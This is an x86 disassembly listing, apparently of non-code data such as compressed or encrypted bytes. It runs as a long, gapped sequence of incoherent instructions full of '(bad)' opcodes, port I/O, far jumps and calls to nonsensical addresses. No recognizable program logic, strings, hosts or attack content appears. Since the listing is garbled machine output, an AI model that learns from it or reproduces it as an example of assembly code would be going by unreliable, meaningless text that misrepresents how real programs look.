  4285fa:	dec    esp
  4285fb:	mov    bl,0x6d
  4285fd:	cmp    esi,DWORD PTR [esi]
  4285ff:	add    DWORD PTR [eax-0x1],ebx
  428602:	xor    al,0xcb
  428604:	pop    ss
  428605:	imul   edx,DWORD PTR [edi-0x74],0x3d44fcc0
  42860c:	repnz (bad) 
  42860f:	int3   
  428610:	mov    ah,0x1d
  428612:	add    al,0x7d
  428614:	jns    0x4285e4
  428616:	and    edi,DWORD PTR [eax+0x3c220547]
  42861c:	pop    ebp
  42861d:	cli    
  42861e:	data16 mov dl,0x89
  428621:	les    esp,FWORD PTR [ebx]
  428623:	shr    DWORD PTR [ecx+0x59],cl
  428626:	out    0x11,eax
  428628:	lds    esi,FWORD PTR [ebp+0x4b]
  42862b:	inc    edx
  42862c:	inc    edi
  42862d:	(bad)  
  42862e:	in     eax,dx
  42862f:	or     eax,0xb9f4cef1
  428634:	or     eax,0xce91d177
  428639:	imul   ecx,DWORD PTR [edi+0x4507bc45],0x1505395a
  428643:	xor    BYTE PTR [edi-0x3b],ch
  428646:	xor    al,0xff
  428648:	shr    BYTE PTR ds:0x168c7800,cl
  42864e:	lahf   
  42864f:	mov    BYTE PTR [ebp-0x17],cl
  428652:	lea    ecx,[esi+0x61]
  428655:	fmul   DWORD PTR ds:0x15737f8c
  42865b:	mov    eax,ds:0x478a1dff
  428660:	loope  0x42866e
  428662:	xchg   esi,eax
  428663:	fnstenv [edx]
  428665:	lods   eax,DWORD PTR ds:[esi]
  428666:	enter  0x3b37,0x4a
  42866a:	xchg   ebp,eax
  42866b:	add    bl,BYTE PTR [eax]
  42866d:	(bad)  
  42866e:	clc    
  42866f:	lods   eax,DWORD PTR ds:[esi]
  428670:	sbb    al,BYTE PTR [edx+0x16dc13bb]
  428676:	pushf  
  428677:	jle    0x42862b
  428679:	sub    BYTE PTR [ebx],dh
  42867b:	add    BYTE PTR [eax+0x17],ah
  42867e:	fcom   QWORD PTR [ecx*4-0x3068b6de]
  428685:	inc    ecx
  428686:	or     ch,cl
  428688:	into   
  428689:	bnd je 0x42861d
  42868c:	jge    0x4286b0
  42868e:	mov    WORD PTR [ebx+0x66],gs
  428691:	shl    BYTE PTR [ecx-0xe],0xf4
  428695:	push   ss
  428696:	call   0x21433dda
  42869b:	das    
  42869c:	cmp    al,0x9
  42869e:	cwde   
  42869f:	repnz loop 0x4286ff
  4286a2:	aaa    
  4286a3:	outs   dx,BYTE PTR ds:[esi]
  4286a4:	or     dh,BYTE PTR [edi]
  4286a6:	imul   ecx,esp,0x4c37a1de
  4286ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286ad:	cwde   
  4286ae:	add    dl,ch
  4286b0:	push   edx
  4286b1:	lds    edx,FWORD PTR [ebp+eax*2-0xc]
	...
  428715:	add    BYTE PTR [esi+0x5b],dl
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x9c6539b]
  428726:	jmp    0x1:0x70001af
  42872d:	add    al,dh
  42872f:	pop    edi
  428730:	mov    bh,0xac
  428732:	sbb    DWORD PTR [edx+0x73],edx
  428735:	push   esp
  428736:	cmp    cl,BYTE PTR [esi+esi*1+0x5a]
  42873a:	jae    0x42877c
  42873c:	je     0x428750
  42873e:	cmp    DWORD PTR [ecx+0x185b4201],ebp
  428744:	repz shl BYTE PTR [ebp+0x64ddc2f0],1
  42874b:	mov    eax,0x373e1669
  428750:	sbb    al,0xb5
  428752:	jbe    0x4287b6
  428754:	adc    bh,BYTE PTR [eax-0x57]
  428757:	cs out 0x39,al
  42875a:	and    al,0x3b
  42875c:	xor    DWORD PTR [ebx-0x6e],esp
  42875f:	dec    esi
  428760:	leave  
  428761:	into   
  428762:	idiv   BYTE PTR [esi-0x3617bb21]
  428768:	sub    eax,DWORD PTR [eax]
  42876a:	lahf   
  42876b:	mov    al,ds:0x1d304e
  428770:	sbb    al,BYTE PTR [edi+eax*2]
  428773:	rcr    DWORD PTR [edi+0x43],1
  428776:	jcxz   0x428718
  428779:	jmp    0xbfee:0x6ab9c46f
  428780:	addr16 rcl bh,cl
  428783:	cmp    al,0xdb
  428785:	push   edi
  428786:	mov    BYTE PTR [eax-0x3f80a67e],dh
  42878c:	mov    bl,0xfa
  42878e:	std    
  42878f:	mov    BYTE PTR [edi+0xf2e315f],dh
  428795:	ss pop esp
  428797:	outs   dx,BYTE PTR ds:[esi]
  428798:	jne    0x42874d
  42879a:	and    eax,0xd799481c
  42879f:	jmp    0x4287b2
  4287a1:	pushf  
  4287a2:	mov    cl,0x17
  4287a4:	and    al,0x54
  4287a6:	cmp    eax,0xbd990809
  4287ab:	adc    BYTE PTR [edx],0xce
  4287ae:	in     al,dx
  4287af:	(bad)  
  4287b0:	add    cl,BYTE PTR [esi+0x7a]
  4287b3:	xor    al,0x1f
  4287b5:	sbb    edx,edx
  4287b7:	repnz rcl DWORD PTR [eax+ecx*4+0x1e6b0f14],0xb8
  4287c0:	push   ebp
  4287c1:	call   0x7473688
  4287c6:	cld    
  4287c7:	push   esi
  4287c8:	ja     0x428810
  4287ca:	cs mov eax,0x689d58ab
  4287d0:	neg    DWORD PTR ds:0xec587972
  4287d6:	loop   0x4287a3
  4287d8:	or     edi,DWORD PTR ds:0xdfff5045
  4287de:	icebp  
  4287df:	xchg   ebx,eax
  4287e0:	test   eax,0x1f3a4030
  4287e5:	adc    al,0xf0
  4287e7:	sbb    esi,DWORD PTR ds:0x18d437f0
  4287ed:	shr    DWORD PTR [ebx+ebx*4+0x18400899],1
  4287f4:	cmc    
  4287f5:	rol    DWORD PTR [esi-0x253c3ff4],cl
  4287fb:	adc    BYTE PTR [ebx+0x58],dl
  4287fe:	sbb    ecx,DWORD PTR [edi-0x260f58ee]
  428804:	adc    dh,BYTE PTR [ecx+0x12]
  428807:	and    ebx,DWORD PTR [ecx]
  428809:	adc    DWORD PTR [ebp-0x5ee61142],ebp
  42880f:	xor    esp,edx
  428811:	iret   
  428812:	dec    esp
  428813:	push   cs
  428814:	fcmovbe st,st(5)
  428816:	xchg   edi,eax
  428817:	les    ebp,FWORD PTR [edi+0x39a744e]
  42881d:	loopne 0x4287a3
  42881f:	outs   dx,DWORD PTR ds:[esi]
  428820:	test   esp,edx
  428822:	mov    al,0x25
  428824:	inc    esi
  428825:	mov    al,ds:0xe23c441d
  42882a:	scas   eax,DWORD PTR es:[edi]
  42882b:	xor    al,0x53
  42882d:	add    BYTE PTR [edi-0x17],dh
  428830:	nop
  428831:	mov    eax,0x464e49
	...
  428896:	es jp  0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR [ecx-0xee25239],ecx
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    ch,dl
  4288af:	lock or dh,bh
  4288b2:	sub    bh,BYTE PTR [ebx]
  4288b4:	hlt    
  4288b5:	pop    ebp
  4288b6:	test   BYTE PTR [ecx+0x74],bl
  4288b9:	push   0xffffffb0
  4288bb:	inc    edi
  4288bc:	fcom   DWORD PTR [edx+0x6761ee95]
  4288c2:	sbb    al,0x4f
  4288c4:	sbb    BYTE PTR [esi-0x32334c30],bh
  4288ca:	loopne 0x4288d4
  4288cc:	mov    WORD PTR [ebx-0x2390b839],ss
  4288d2:	out    dx,eax
  4288d3:	out    dx,al
  4288d4:	xlat   BYTE PTR ds:[ebx]
  4288d5:	sub    al,0xfc
  4288d7:	into   
  4288d8:	dec    ebx
  4288d9:	out    0xc1,eax
  4288db:	(bad)  
  4288dd:	es push eax
  4288df:	(bad)  
  4288e0:	push   ebx
  4288e1:	dec    edx
  4288e2:	xchg   ebp,eax
  4288e3:	js     0x428879
  4288e5:	scas   al,BYTE PTR es:[edi]
  4288e6:	je     0x428881
  4288e8:	mov    esp,0xe8481516
  4288ed:	mov    al,0xf3
  4288ef:	loopne 0x4288f7
  4288f1:	dec    esi
  4288f2:	sbb    BYTE PTR [ebp-0x3d],ch
  4288f5:	or     eax,0xe1f2be7f
  4288fa:	mov    cl,0x3e
  4288fc:	nop
  4288fd:	pop    ecx
  4288fe:	test   DWORD PTR [eax+0x2d],edi
  428901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428902:	cmp    DWORD PTR [eax+0x6b6f1205],ebx
  428908:	push   esi
  428909:	xchg   ebx,eax
  42890a:	nop
  42890b:	inc    edx
  42890c:	les    edi,FWORD PTR [ebp-0x60]
  42890f:	test   ebp,0xf73197c2
  428915:	(bad)  
  428916:	jmp    FWORD PTR [esi+0x4b8bd30a]
  42891c:	xor    esi,edi
  42891e:	call   0x912ba064
  428923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428924:	push   0x20850afa
  428929:	int3   
  42892a:	out    dx,al
  42892b:	xor    eax,0x4d74f0a0
  428930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428931:	lsl    ebp,WORD PTR gs:[edx-0xcd90065]
  428939:	inc    ebp
  42893a:	sbb    ebp,DWORD PTR ds:0x4b437699
  428940:	inc    esi
  428941:	lea    esi,[esi]
  428943:	inc    ebp
  428944:	shr    ebx,1
  428946:	mov    eax,ds:0x5abcac43
  42894b:	mov    cl,0x9a
  42894d:	outs   dx,BYTE PTR ds:[esi]
  42894e:	outs   dx,BYTE PTR ds:[esi]
  42894f:	xchg   esi,eax
  428950:	and    cl,BYTE PTR [edi-0x15cdc355]
  428956:	and    BYTE PTR [ecx],ch
  428958:	std    
  428959:	cmp    eax,edi
  42895b:	and    DWORD PTR fs:[eax+0x59cd6205],0xf5b1f25b
  428966:	pop    ds
  428967:	out    dx,al
  428968:	outs   dx,BYTE PTR ds:[esi]
  428969:	lds    esi,FWORD PTR [esi-0x21]
  42896c:	or     eax,DWORD PTR [ebx+0x3bc64c69]
  428972:	stos   DWORD PTR es:[edi],eax
  428973:	and    DWORD PTR [ecx+0x33],0x345930df
  42897a:	pop    ebx
  42897b:	mov    al,ds:0x9eb03736
  428980:	push   edi
  428981:	loop   0x42893f
  428983:	adc    cl,dh
  428985:	mov    ah,0xfa
  428987:	mov    ecx,edx
  428989:	rol    DWORD PTR [si],1
  42898c:	out    0xc1,eax
  42898e:	imul   edx,DWORD PTR [edi-0x74],0x5d
  428992:	cmp    eax,esp
  428994:	pop    ecx
  428995:	inc    edx
  428996:	pop    esi
  428997:	in     eax,0x79
  428999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42899a:	sbb    eax,0xf268b992
  42899f:	std    
  4289a0:	xchg   edi,eax
  4289a1:	mov    DWORD PTR [edi],ecx
  4289a3:	adc    BYTE PTR [ebp+eiz*2+0x1262843b],bl
  4289aa:	and    al,0xe4
  4289ac:	pusha  
  4289ad:	lods   eax,DWORD PTR ds:[esi]
  4289ae:	rcr    DWORD PTR [edx],1
  4289b0:	sub    al,0x46
  4289b2:	jge    0x4289ab
  4289b4:	aam    0x0
	...
  428a16:	dec    ebp
  428a17:	or     al,0xf8
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	stos   BYTE PTR es:[edi],al
  428a23:	stos   DWORD PTR es:[edi],eax
  428a24:	jnp    0x428a86
  428a26:	clc    
  428a27:	mov    cl,0x1
  428a29:	add    BYTE PTR [edi],al
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    BYTE PTR ds:0xe6b2576b,dh
  428a33:	cdq    
  428a34:	ins    BYTE PTR es:[edi],dx
  428a35:	stc    
  428a36:	ins    DWORD PTR es:[edi],dx
  428a37:	push   ebx
  428a38:	inc    esp
  428a39:	(bad)  
  428a3a:	in     eax,0x4c
  428a3c:	pop    esp
  428a3d:	out    0x6e,eax
  428a3f:	add    BYTE PTR [ecx+0x3af8487e],dh
  428a45:	jne    0x428a6d
  428a47:	add    BYTE PTR [esi],bl
  428a49:	mov    dh,0x34
  428a4b:	test   al,0x7f
  428a4d:	or     DWORD PTR [ebx-0x29],0x29090899
  428a54:	into   
  428a55:	push   ecx
  428a56:	and    cl,bl
  428a58:	xor    eax,0xff1bf7e6
  428a5d:	in     eax,0xde
  428a5f:	(bad)  
  428a60:	pop    ss
  428a61:	xchg   BYTE PTR [ebx+0x485c1527],al
  428a67:	xor    dh,ah
  428a69:	mov    ebp,0x856ef69e
  428a6e:	jg     0x428a8f
  428a70:	rcl    DWORD PTR [ebp-0x4],0x27
  428a74:	jle    0x428aaa
  428a76:	lock sahf 
  428a78:	jl     0x428a3c
  428a7a:	sub    bp,bp
  428a7d:	(bad)  
  428a7e:	sub    dh,BYTE PTR [edi-0x75]
  428a81:	inc    cx
  428a83:	adc    al,0x77
  428a85:	inc    ebp
  428a86:	rol    dh,1
  428a88:	or     DWORD PTR [ebx-0x19103aa3],ebx
  428a8e:	ret    
  428a8f:	add    DWORD PTR [eax],0x704510ce
  428a95:	lahf   
  428a96:	enter  0x720c,0xa7
  428a9a:	jo     0x428ac5
  428a9c:	cmp    eax,0x8ec59bf2
  428aa1:	inc    edx
  428aa2:	mov    ds,WORD PTR [edi]
  428aa4:	add    ebx,DWORD PTR [esi+ecx*2]
  428aa7:	lds    esi,FWORD PTR [ebx+0x24d42759]
  428aad:	es js  0x428a3a
  428ab0:	sbb    ecx,ebx
  428ab2:	pop    es
  428ab3:	jo     0x428a70
  428ab5:	bound  ebx,QWORD PTR [edx+0x2a2d5a49]
  428abb:	std    
  428abc:	sub    eax,0x8ab3ee8d
  428ac1:	add    eax,0x25cbb423
  428ac6:	sub    BYTE PTR [ebp+0x36],ch
  428ac9:	ror    ebx,cl
  428acb:	and    BYTE PTR [edx],al
  428acd:	mov    BYTE PTR [ebx+0xe],bh
  428ad0:	leave  
  428ad1:	out    dx,eax
  428ad2:	jmp    0xfa25ca81
  428ad7:	mov    ds:0x3c4388ec,al
  428adc:	int    0x4e
  428ade:	pop    es
  428adf:	pop    ecx
  428ae0:	cmp    BYTE PTR [edx+0x78],bl
  428ae3:	and    eax,0x6559e025
  428ae8:	inc    esp
  428ae9:	mov    bh,0xa4
  428aeb:	adc    ecx,0x4f6624ce
  428af1:	cmp    BYTE PTR [ebx],dh
  428af3:	jge    0x428abb
  428af5:	cmc    
  428af6:	xor    esp,DWORD PTR [ecx+0x604fc5de]
  428afc:	xor    ah,BYTE PTR [ecx-0xd65680a]
  428b02:	into   
  428b03:	ins    DWORD PTR es:[edi],dx
  428b04:	call   0xa4dd:0x7b17f609
  428b0b:	mov    eax,ds:0xabd75081
  428b10:	pop    edx
  428b11:	mov    dh,0xc9
  428b13:	cmp    al,0xe1
  428b15:	ret    
  428b16:	(bad)  
  428b17:	test   eax,0x19889767
  428b1c:	repz aam 0xac
  428b1f:	push   ebp
  428b20:	cdq    
  428b21:	xor    BYTE PTR [edi],dh
  428b23:	cli    
  428b24:	scas   eax,DWORD PTR es:[edi]
  428b25:	and    eax,0x552484e8
  428b2a:	xor    dh,BYTE PTR [edx-0x2e]
  428b2d:	lock out 0xe6,eax
  428b30:	sub    esi,eax
  428b32:	mov    ebp,0x52df
	...
  428b93:	add    BYTE PTR [eax],al
  428b95:	add    ch,al
  428b97:	push   ebp
  428b98:	mov    bh,dl
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0xa2a9493e
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	fmul   st(0),st
  428bb0:	fadd   QWORD PTR [ebx+ebx*2]
  428bb3:	push   0x2b
  428bb5:	(bad)  
  428bb6:	fadd   QWORD PTR [ebx]
  428bb8:	adc    bl,0x4a
  428bbb:	mov    cl,0x4f
  428bbd:	rol    BYTE PTR [esi+0x1055c6bb],cl
  428bc3:	push   esi
  428bc4:	cwde   
  428bc5:	sbb    DWORD PTR [ecx+eiz*8],esp
  428bc8:	hlt    
  428bc9:	or     BYTE PTR [edi+0x52],al
  428bcc:	jnp    0x428ba7
  428bce:	add    ch,BYTE PTR [ecx+0x4c5dbc20]
  428bd4:	not    BYTE PTR ds:0xf72515c4
  428bda:	scas   al,BYTE PTR es:[edi]
  428bdb:	and    al,0xb7
  428bdd:	or     BYTE PTR [edx-0x58],dl
  428be0:	jmp    0xb509e3ba
  428be5:	stos   BYTE PTR es:[edi],al
  428be6:	enter  0xd72,0x50
  428bea:	pop    eax
  428beb:	mov    eax,edx
  428bed:	sahf   
  428bee:	in     al,dx
  428bef:	stos   DWORD PTR es:[edi],eax
  428bf0:	jno    0x428b79
  428bf2:	fadd   DWORD PTR [ecx-0x49bd884f]
  428bf8:	add    eax,0xbcd7d653
  428bfd:	idiv   DWORD PTR [edx-0x32]
  428c00:	push   DWORD PTR [eax]
  428c02:	pop    es
  428c03:	not    BYTE PTR [ecx]
  428c05:	xchg   ecx,eax
  428c06:	das    
  428c07:	cmp    bh,cl
  428c09:	gs nop
  428c0b:	scas   al,BYTE PTR es:[edi]
  428c0c:	mov    eax,0x40d1e2d9
  428c11:	dec    ecx
  428c12:	and    DWORD PTR [edi+0xa],edi
  428c15:	mov    dh,0xe5
  428c17:	pop    es
  428c18:	rcr    BYTE PTR [esi-0x20],1
  428c1b:	or     eax,0x4cd571d0
  428c20:	sub    ecx,eax
  428c22:	and    bl,BYTE PTR [eax+0x765bb117]
  428c28:	xor    al,0xd8
  428c2a:	loope  0x428bfc
  428c2c:	sbb    eax,ecx
  428c2e:	es std 
  428c30:	lods   eax,DWORD PTR ds:[esi]
  428c31:	hlt    
  428c32:	inc    edx
  428c33:	dec    edx
  428c34:	leave  
  428c35:	mov    WORD PTR [ecx+0xbddb05],ds
  428c3b:	jbe    0x428c83
  428c3d:	fld    QWORD PTR [esp+ecx*4]
  428c40:	loopne 0x428c4d
  428c42:	or     ebx,ebp
  428c44:	add    eax,0xa0702c8e
  428c49:	xor    eax,0xf0dc17fb
  428c4e:	sbb    ebx,DWORD PTR [ecx+edi*8]
  428c51:	mov    dl,0x82
  428c53:	mov    cl,0x75
  428c55:	mov    dh,BYTE PTR [edx-0x30e70eb7]
  428c5b:	lock cdq 
  428c5d:	lock xchg DWORD PTR fs:[eax+esi*2-0x5e92a866],esp
  428c66:	jmp    0x11fc3766
  428c6b:	pop    ecx
  428c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c6d:	mov    edi,0x746e2a85
  428c72:	not    DWORD PTR [ebx+0x77]
  428c75:	mov    cl,0xae
  428c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c78:	dec    edx
  428c79:	sub    ebp,DWORD PTR [esi]
  428c7b:	add    DWORD PTR [edi+0x65],esp
  428c7e:	aad    0xd5
  428c80:	push   ebx
  428c81:	fisttp DWORD PTR [edx]
  428c83:	xlat   BYTE PTR ds:[ebx]
  428c84:	sbb    ecx,ebx
  428c86:	sbb    eax,0x8aff148a
  428c8b:	test   DWORD PTR [edi-0x7bc94884],edi
  428c91:	cmp    dh,BYTE PTR [ebp+0x4c085527]
  428c97:	lods   al,BYTE PTR ds:[esi]
  428c98:	lods   eax,DWORD PTR ds:[esi]
  428c99:	scas   al,BYTE PTR es:[edi]
  428c9a:	add    BYTE PTR [ebx+0x4189e50f],dh
  428ca0:	inc    eax
  428ca1:	imul   BYTE PTR [eax-0x67]
  428ca4:	es inc edi
  428ca6:	shl    ebp,1
  428ca8:	jmp    0x428d1a
  428caa:	push   ebx
  428cab:	cli    
  428cac:	cli    
  428cad:	and    ecx,DWORD PTR ds:0x986904e3
  428cb3:	and    al,0xc6
	...
  428d15:	add    BYTE PTR [ecx-0xace0e4b],al
  428d1b:	jne    0x428cde
  428d1d:	mov    ch,0x86
  428d1f:	xchg   esi,eax
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428cd9
  428d23:	jno    0x428d3a
  428d25:	loop   0x428d2d
  428d27:	mov    ah,0x1
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    BYTE PTR [eax],cl
  428d2f:	push   es
  428d30:	sub    eax,0x7c28d882
  428d35:	pop    edi
  428d36:	and    dl,BYTE PTR ss:[edi-0x628cfc74]
  428d3d:	xchg   ebx,eax
  428d3e:	or     al,0x2
  428d40:	jl     0x428d44
  428d42:	dec    ebx
  428d43:	adc    eax,0xe4befd4
  428d48:	stos   DWORD PTR es:[edi],eax
  428d49:	push   ebp
  428d4a:	cmp    al,0xf0
  428d4c:	mov    eax,ds:0x740cd4c2
  428d51:	push   eax
  428d52:	sysexit 
  428d54:	or     ebp,DWORD PTR [ebp+0x3e]
  428d57:	push   ds
  428d58:	inc    ebx
  428d59:	lds    ebx,FWORD PTR [ebx-0x5e]
  428d5c:	mov    esi,0x6b2b6511
  428d61:	mov    ah,0xbf
  428d63:	jl     0x428d78
  428d65:	pushf  
  428d66:	outs   dx,DWORD PTR ds:[esi]
  428d67:	or     DWORD PTR [ecx+0x6c8c9ce2],esp
  428d6d:	pop    ecx
  428d6e:	rcl    DWORD PTR [ecx+0x9],cl
  428d71:	ins    BYTE PTR es:[edi],dx
  428d72:	mov    al,ds:0x616876f5
  428d77:	lods   eax,DWORD PTR ds:[esi]
  428d78:	out    dx,al
  428d79:	enter  0x7f14,0xe
  428d7d:	and    eax,0x2b79474f
  428d82:	sub    ecx,ebx
  428d84:	sar    BYTE PTR [eax-0x5c4a1ebc],1
  428d8a:	add    BYTE PTR [eax],0x71
  428d8d:	push   eax
  428d8e:	(bad)  
  428d90:	jle    0x428d7e
  428d92:	dec    eax
  428d93:	je     0x428deb
  428d95:	or     BYTE PTR [ebp+0xd70b4b5],cl
  428d9b:	enter  0xb4cd,0xd2
  428d9f:	pop    ds
  428da0:	(bad)  
  428da1:	fcom   QWORD PTR [ecx+ecx*8+0x5b]
  428da5:	xchg   ebx,eax
  428da6:	sub    cl,BYTE PTR [eax]
  428da8:	add    esi,DWORD PTR [esi-0x5]
  428dab:	sub    DWORD PTR [ecx],0xffffff8b
  428dae:	shr    BYTE PTR [edx+esi*1],cl
  428db1:	ror    BYTE PTR [edi+esi*4],1
  428db4:	test   eax,0xf6756243
  428db9:	out    0x11,al
  428dbb:	ss cmp ecx,esp
  428dbe:	aas    
  428dbf:	hlt    
  428dc0:	int    0xe0
  428dc2:	dec    ecx
  428dc3:	push   es
  428dc4:	mov    ebx,0xde245125
  428dc9:	mov    ds:0x373c99e,eax
  428dce:	mov    al,ds:0xa54f3235
  428dd3:	fwait
  428dd4:	shr    BYTE PTR ds:0x6977ee80,cl
  428dda:	jbe    0x428e33
  428ddc:	mov    bl,0xd
  428dde:	retf   0x49e1
  428de1:	inc    edx
  428de2:	popa   
  428de3:	push   es
  428de4:	ss dec eax
  428de6:	aaa    
  428de7:	jnp    0x428e16
  428de9:	pushf  
  428dea:	pop    es
  428deb:	loope  0x428e4c
  428ded:	bound  ebp,QWORD PTR [esi-0x1c]
  428df0:	push   ss
  428df1:	call   DWORD PTR ds:0x21e25c08
  428df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428df8:	in     al,0xe5
  428dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428dfb:	mov    al,0x1c
  428dfd:	leave  
  428dfe:	ret    
  428dff:	cdq    
  428e00:	sbb    edi,edi
  428e02:	loop   0x428e2a
  428e04:	scas   al,BYTE PTR es:[edi]
  428e05:	mov    bl,0x1c
  428e07:	pop    ds
  428e08:	out    dx,al
  428e09:	or     eax,DWORD PTR [esi-0x50]
  428e0c:	inc    ebx
  428e0d:	in     al,0x9b
  428e0f:	jp     0x428e08
  428e11:	scas   al,BYTE PTR es:[edi]
  428e12:	mov    esi,0xfe21ba15
  428e17:	(bad)  
  428e18:	ja     0x428e2a
  428e1a:	pop    esp
  428e1b:	and    al,0x6e
  428e1d:	push   ds
  428e1e:	(bad)  
  428e1f:	and    eax,0xdb5f3014
  428e24:	dec    ebp
  428e25:	mov    eax,ds:0x519f6e82
  428e2a:	arpl   WORD PTR [ebp-0x5f3308de],sp
  428e30:	or     esp,edx
  428e32:	lds    ecx,FWORD PTR [esi+0x1e]
	...
  428e95:	add    BYTE PTR [edi+0x5d],cl
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	adc    cl,BYTE PTR [edx]
  428ea4:	mov    esi,DWORD PTR [edx+0xd]
  428ea7:	mov    ch,0x1
  428ea9:	add    BYTE PTR [edi],al
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    BYTE PTR [edx+0x64],cl
  428eb0:	jae    0x428ef3
  428eb2:	cmp    DWORD PTR [esi+ebx*4+0x346f372b],esp
  428eb9:	fsubr  st(7),st
  428ebb:	inc    edx
  428ebc:	and    esi,ecx
  428ebe:	pop    esi
  428ebf:	mov    ebx,0x386ae369
  428ec4:	and    eax,0x1097929e
  428ec9:	nop
  428eca:	sub    DWORD PTR [ebp-0x37],eax
  428ecd:	imul   esi,esi,0x37
  428ed0:	inc    edi
  428ed1:	shl    DWORD PTR [edi-0x5f],0x82
  428ed5:	(bad)  
  428ed6:	das    
  428ed7:	fcom   DWORD PTR [ebp+edi*1-0x49]
  428edb:	inc    ebx
  428edc:	fist   DWORD PTR ds:0x262d8058
  428ee2:	ss push edx
  428ee4:	icebp  
  428ee5:	sti    
  428ee6:	nop
  428ee7:	cwde   
  428ee8:	sbb    al,0xc5
  428eea:	mov    dh,0xde
  428eec:	aam    0x9a
  428eee:	(bad)  
  428eef:	mov    ds:0x2790d653,eax
  428ef4:	fdivr  st,st(3)
  428ef6:	int    0xc1
  428ef8:	push   eax
  428ef9:	cmp    eax,edx
  428efb:	jmp    0x428ec1
  428efd:	shl    edx,1
  428eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f00:	retf   
  428f01:	pusha  
  428f02:	xor    BYTE PTR [edx+0x40],dh
  428f05:	loopne 0x428edc
  428f07:	xchg   esp,eax
  428f08:	cs push ebx
  428f0a:	mov    al,0x5a
  428f0c:	push   ss
  428f0d:	(bad)
  428f11:	sub    cl,dl
  428f13:	aas    
  428f14:	pop    ss
  428f15:	add    eax,edi
  428f17:	mov    edx,0xfd2f242f
  428f1c:	(bad)  
  428f1d:	lock cmp DWORD PTR [ebx+0x44],0x63890702
  428f25:	shl    DWORD PTR [ebp+0x2a],cl
  428f28:	ret    0x3669
  428f2b:	push   cs
  428f2c:	sbb    DWORD PTR [ecx-0x1c567b52],esi
  428f32:	cs aam 0x34
  428f35:	(bad)  
  428f36:	xchg   esi,eax
  428f37:	xchg   edx,eax
  428f38:	adc    DWORD PTR [edx-0x6b],ebx
  428f3b:	dec    esi
  428f3c:	retf   
  428f3d:	enter  0x17c6,0xeb
  428f41:	retf   0x1e2
  428f44:	repnz or BYTE PTR [edi],dh
  428f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f48:	jle    0x428f4d
  428f4a:	fucomi st,st(5)
  428f4c:	loopne 0x428f6f
  428f4e:	inc    eax
  428f4f:	(bad)  
  428f50:	jo     0x428f0b
  428f52:	mov    dl,0xd5
  428f54:	adc    BYTE PTR [eax-0x5836e24f],dh
  428f5a:	test   ch,bl
  428f5c:	mov    dh,0x6a
  428f5e:	gs aas 
  428f60:	in     al,0xb2
  428f62:	or     eax,ebp
  428f64:	mov    ecx,0xd7cd62bc
  428f69:	(bad)  
  428f6a:	and    eax,0x5d5a4ccf
  428f6f:	push   DWORD PTR [ecx+eax*8]
  428f72:	pop    ebx
  428f73:	aas    
  428f74:	cld    
  428f75:	out    dx,al
  428f76:	mov    ch,0xc
  428f78:	mov    edx,0x911c9467
  428f7d:	add    DWORD PTR [eax-0x19ea9d3b],esp
  428f83:	ins    BYTE PTR es:[edi],dx
  428f84:	mov    WORD PTR [ebp+0x329756ad],ss
  428f8a:	popf   
  428f8b:	push   cs
  428f8c:	shr    dl,1
  428f8e:	add    ah,ch
  428f90:	jl     0x428f27
  428f92:	sub    edx,DWORD PTR [edi+ecx*8+0x41]
  428f96:	test   eax,0x68b33a56
  428f9b:	in     al,0xdc
  428f9d:	and    ebp,ecx
  428f9f:	jnp    0x428fea
  428fa1:	cmp    DWORD PTR [ebp-0x251d4969],ecx
  428fa7:	sub    al,0x83
  428fa9:	std    
  428faa:	push   ebx
  428fab:	cmp    ebp,DWORD PTR [eax]
  428fad:	pop    eax
  428fae:	xchg   edi,eax
  428faf:	inc    BYTE PTR [edx+edi*2+0xbbc5dd]
	...
  429016:	loope  0x429004
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [ebp-0x56],edi
  429024:	xchg   edx,eax
  429025:	unpcklps xmm6,XMMWORD PTR [esi+0x1070001]
  42902c:	add    BYTE PTR [eax],al
  42902e:	and    dh,BYTE PTR [ebp-0x2238411e]
  429034:	sbb    eax,0x35dcfd5
  429039:	pop    ss
  42903a:	test   eax,0xab3898ac
  42903f:	clc    
  429040:	stos   DWORD PTR es:[edi],eax
  429041:	jb     0x4290b8
  429043:	mov    ebp,0xf880daf5
  429048:	ret    
  429049:	cmp    BYTE PTR [ebp+0x4d71911d],dh
  42904f:	xor    BYTE PTR [edx],0xd8
  429052:	cmp    BYTE PTR [ecx-0x71],0x1a
  429056:	jecxz  0x429029
  429058:	dec    edx
  429059:	cwde   
